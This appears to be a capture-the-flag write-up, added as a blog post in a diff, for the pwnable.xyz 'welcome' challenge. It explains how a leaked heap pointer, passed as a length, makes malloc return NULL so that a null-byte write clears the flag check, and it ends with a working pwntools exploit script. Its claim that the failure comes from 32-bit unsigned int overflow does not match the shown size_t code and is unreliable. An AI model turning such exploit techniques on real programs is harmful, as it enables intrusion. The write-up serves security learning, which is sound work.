@@ -1,0 +1,197 @@
+---
+title: pwnable.xyz - welcome
+date: '2025-05-22'
+tags: ['pwn', 'malloc', 'pwnablexyz']
+draft: false
+summary: malloc failing by integer overflow causing NULL
+---
+
+## Analysis
+
+We are given a binary with the following protections
+
+```
+❯ checksec challenge
+
+[*] '/home/mfkrypt/pwn-learning-notes/pwnablexyz/welcome/challenge'
+    Arch:       amd64-64-little
+    RELRO:      Full RELRO
+    Stack:      Canary found
+    NX:         NX enabled
+    PIE:        PIE enabled
+    FORTIFY:    Enabled
+```
+
+We can observe all protections are enabled. Running the binary itself reveals a leak
+
+![Description](/static/images/pwnablexyz/1.png)
+
+Let us now check the decompiled source
+
+```c
+undefined8 main(void)
+
+{
+  long *malloc_ret;
+  void *buffer;
+  long in_FS_OFFSET;
+  size_t length;
+  long canary;
+  
+  canary = *(long *)(in_FS_OFFSET + 0x28);
+  setup();
+
+  puts("Welcome.");
+  malloc_ret = (long *)malloc(262144);
+  *malloc_ret = 1;  // Stores the integer 1 at the beginning of that allocated memory
+
+  __printf_chk(1,"Leak: %p\n",malloc_ret);
+  __printf_chk(1,"Length of your message: ");
+
+  length = 0;
+  __isoc99_scanf(&DAT_00100c50,&length);
+  buffer = malloc(length);
+  __printf_chk(1,"Enter your message: ");
+
+  read(0,buffer,length);
+  *(undefined *)((long)buffer + (length - 1)) = 0;
+
+  write(1,buffer,length);
+  if (*malloc_ret == 0) {
+    system("cat /flag");
+  }
+
+  if (canary != *(long *)(in_FS_OFFSET + 0x28)) {
+                    /* WARNING: Subroutine does not return */
+    __stack_chk_fail();
+  }
+  
+  return 0;
+}
+```
+
+We can see over here:
+
+```c
+malloc_ret = (long *)malloc(262144);
+*malloc_ret = 1;
+```
+
+`malloc` returns a pointer, `malloc_ret` and assigned an integer value of `1` . It will probably look like this in memory:
+
+```
+0x7fad99950010:  0x0000000000000001
+```
+
+In this line:
+
+```c
+ __printf_chk(1,"Leak: %p\n",malloc_ret);
+```
+
+It leaks the heap address of the returned `malloc` pointer. Other than that,&#x20;
+
+```c
+__isoc99_scanf(&DAT_00100c50,&length);
+buffer = malloc(length);
+
+read(0,buffer,length);
+```
+
+Allocates the `length` we input which is a `long integer` type to allocate memory to a buffer and then reads up the buffer up to the `length` .
+
+And the part below writes a null byte at the last byte of the input buffer
+
+```c
+*(undefined *)((long)buffer + (length - 1)) = 0;
+write(1,buffer,length);
+```
+
+if the returned `malloc` integer value is `0` , we get the flag
+
+```c
+if (*malloc_ret == 0) {
+    system("cat /flag");
+  }
+```
+
+***
+
+## Plan
+
+Looking at the man page of `malloc`
+
+![Description](/static/images/pwnablexyz/2.png)
+
+On error, `malloc` returns NULL . Okay, soooo how does this affect what we are going to do? Well, since the program leaks an address, we can take advantage of that address and use it as a size to fail `malloc` when it allocates memory.
+
+The leaked heap pointer isn’t used as a pointer in the logic — it’s used as a large number to trigger `malloc` failure.
+
+Why does it error or fail? For example, the leaked pointer address is `0x7fb304b31010` the equivalent in decimal is `140406854717456` . That is 14TB of memory which is way too huge since the max value for `unsigned int` is `4,294,967,295` .
+
+![Description](/static/images/pwnablexyz/3.png)
+
+On a 32-bit `unsigned int`, very large values like the leaked address, `0x7fb304b31010` will overflow and may result in a small or even negative signed `int` when passed to `malloc`, which causes it to fail and return `NULL`
+
+After overflowing the pointer of `malloc` In this line:
+
+```c
+*(undefined *)((long)buffer + (length - 1)) = 0;
+```
+
+the `buffer` turns to `NULL` after the error:
+
+```c
+NULL + length - 1 = length - 1
+```
+
+That `length - 1` ends up being **exactly** the leaked address `malloc_ret` . So to make up for this we need to input the `leak_address + 1` to cancel the `length - 1` . But we need to convert them into a `str` type because `scanf` here expects a string input of the `unsigned long int` .
+
+## Exploit
+
+We can manipulate `length` such that `malloc(length)` returns `NULL`, and therefore `buffer = NULL`. Then:
+
+```c
+*(buffer + length - 1) = 0;
+// becomes:
+
+*(NULL + leaked_address) = 0;
+// which writes a zero byte to *malloc_ret
+```
+
+Here is the script:
+
+```python
+from pwn import *
+
+elf = context.binary = ELF('./challenge', checksec=False)
+libc = elf.libc
+
+gs = '''
+c
+'''
+
+def start():
+    if args.GDB:
+        return gdb.debug(elf.path, gdbscript=gs)
+    else:
+        return process(elf.path)
+
+
+def exploit():
+    io = start()
+
+    io.recvuntil(b'Leak: ')
+    leak = int(io.recvline(), 16)
+
+    log.success(f"Leaked malloc address: {hex(leak)}")
+
+    io.sendlineafter(b'Length of your message: ', str(leak + 1))
+    io.sendlineafter(b'Enter your message: ', "cool")
+
+    io.interactive()
+
+
+if __name__ == "__main__":
+    exploit()
+```
